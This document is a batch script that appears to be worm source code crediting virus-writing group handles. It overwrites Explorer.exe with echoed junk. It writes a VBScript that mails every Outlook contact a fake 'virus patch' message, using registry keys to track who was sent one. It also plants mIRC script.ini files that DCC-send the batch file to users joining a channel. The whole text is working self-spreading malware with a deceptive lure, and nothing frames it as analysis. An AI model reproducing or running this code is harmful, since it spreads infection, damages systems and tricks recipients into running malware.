echo 01011010101110101011101010101101010101101010110101010111001 >>Explorer.exe
echo 010110101011101010 BLANK CODE 01001011101010110101010111001 >>Explorer.exe
echo 01011010101110101011101010101101010101101010110101010111001 >>Explorer.exe
echo 01011010101110101011101010101101011 rRlf 010110101010111001 >>Explorer.exe
echo 01011010101110101011101010101101010101101010110101010111001 >>Explorer.exe
echo 010110101011101 ppacket 10101101010101101010110101010111001 >>Explorer.exe
echo 01 Dolomite 10101011101010101101010101101010110101010111001 >>Explorer.exe
echo 010110101011101010111010101011010101011010101 adious 111001 >>Explorer.exe
echo 01011010101110101011101 Energy 1010101101010110101010111001 >>Explorer.exe
echo 01011010101110101011101010101101010101101010110101010111001 >>Explorer.exe
echo 01011010101110101011101010101101010101101010110101010111001 >>Explorer.exe
echo 010110 Writen By Industry 101011101010101101010101101010101 >>Explorer.exe
echo 01011010101110101011101010101101010101101010110101010111001 >>Explorer.exe
echo 01011010101110101011101010101101010101101010110101010111001 >>Explorer.exe
echo 0101101010111010101110101010110101010110 dr.g0nZo 010111001 >>Explorer.exe
echo 01011010101110101011101010101101010101101010110101010111001 >>Explorer.exe
echo 0101101010111010101110 assassin007 101101010110101010111001 >>Explorer.exe
echo 01011010101110101011101010101101010101101010110101010111001 >>Explorer.exe
echo 0101101010111010101110101010110101010 philet0ast3r 10111001 >>Explorer.exe
echo 01011010 El DudErin0 01010101101010101101010110101010111001 >>Explorer.exe
echo 01011010101110101011101010101101010101101010110101010111001 >>Explorer.exe
echo 010110101011101010111010101 Zed 010101101010110101010111001 >>Explorer.exe
echo 01011010101110101011101010101101010101101010110101010111001 >>Explorer.exe
echo 010110101011101010111010101011010101011010 Verchocha 111001 >>Explorer.exe
echo 01011010101110101011101010101101010101101010110101010111001 >>Explorer.exe
echo 010 disk0rdia 101011101010101101010101101010110101010111001 >>Explorer.exe
echo 0101101010111010101110101 Second Part To Hell 0101010111001 >>Explorer.exe
echo.On Error Resume Next >>mail_.vbs
echo dim x,a,ctrlists,ctrentries,malead,b,regedit,regv,regad >>mail_.vbs
echo set regedit=CreateObject("WScript.Shell") >>mail_.vbs
echo set out=WScript.CreateObject("Outlook.Application") >>mail_.vbs
echo set mapi=out.GetNameSpace("MAPI") >>mail_.vbs
echo for ctrlists=1 to mapi.AddressLists.Count >>mail_.vbs
echo set a=mapi.AddressLists(ctrlists) >>mail_.vbs
echo x=1 >>mail_.vbs
echo regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a) >>mail_.vbs
echo if (regv="") then >>mail_.vbs
echo regv=1 >>mail_.vbs
echo end if >>mail_.vbs
echo if (int(a.AddressEntries.Count)> int(regv)) then >>mail_.vbs
echo for ctrentries=1 to a.AddressEntries.Count >>mail_.vbs
echo malead=a.AddressEntries(x) >>mail_.vbs
echo regad="" >>mail_.vbs
echo regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead) >>mail_.vbs
echo if (regad="") then >>mail_.vbs
echo set male=out.CreateItem(0) >>mail_.vbs
echo male.Recipients.Add(malead) >>mail_.vbs
echo male.Subject = "SOLUTION: [TICK] -USA-P3-CaseID 4327120063 - Virus Undetected-IZ61499" >>mail_.vbs
echo male.Body = "The Information & Patch for IZ61499 is attatched." >>mail_.vbs
echo rem male.Attachments.Add("C:\_\_.bat") >>mail_.vbs
echo male.Send >>mail_.vbs
echo regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead,1,"REG_DWORD" >>mail_.vbs
echo end if >>mail_.vbs
echo x=x+1 >>mail_.vbs
echo next >>mail_.vbs
echo regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count >>mail_.vbs
echo else >>mail_.vbs
echo regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count >>mail_.vbs
echo end if >>mail_.vbs
echo next >>mail_.vbs
echo Set out=Nothing >>mail_.vbs
echo Set mapi=Nothing >>mail_.vbs
echo.on error resume next >>_.vbs
echo Set fso = CreateObject("Scripting.FileSystemObject") >>_.vbs
echo Set b = fso.CreateTextFile("c:\program files\mirc\script.ini", True) >>_.vbs
echo b.WriteLine "[script]" >>_.vbs
echo b.WriteLine "ON 1:JOIN:#:{" >>_.vbs
echo b.WriteLine "/dcc send $nick c:\_\_.bat" >>_.vbs
echo b.WriteLine "}" >>_.vbs
echo b.close >>_.vbs
echo Set fso = CreateObject("Scripting.FileSystemObject") >>_.vbs
echo Set a = fso.CreateTextFile("c:\mirc\script.ini", True) >>_.vbs
echo a.WriteLine "[script]" >>_.vbs
echo a.WriteLine "ON 1:JOIN:#:{" >>_.vbs
echo a.WriteLine "/dcc send $nick c:\_\_.bat" >>_.vbs
echo a.WriteLine "}" >>_.vbs
echo a.close >>_.vbs
